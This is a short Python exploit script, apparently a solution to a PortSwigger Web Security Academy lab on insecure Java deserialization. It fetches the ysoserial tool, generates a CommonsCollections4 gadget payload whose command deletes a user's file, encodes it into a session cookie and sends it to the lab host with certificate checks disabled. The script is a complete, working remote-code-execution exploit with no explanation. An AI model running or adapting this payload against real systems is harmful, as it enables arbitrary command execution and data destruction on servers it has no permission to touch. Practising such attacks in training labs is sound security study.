import subprocess
import urllib.parse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#Download ysoserial and generating the payload

download = subprocess.run(["wget", "-nc", "https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar"])
payload = subprocess.getoutput("java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 | tr -d '\n'")

serial_url_encode = urllib.parse.quote_plus(payload)
headers = {"cookie": "session="+serial_url_encode}

# exploit

r = requests.get("https://0a8c004903bebc58c0532bd300820059.web-security-academy.net/", headers=headers, allow_redirects=False, verify=False)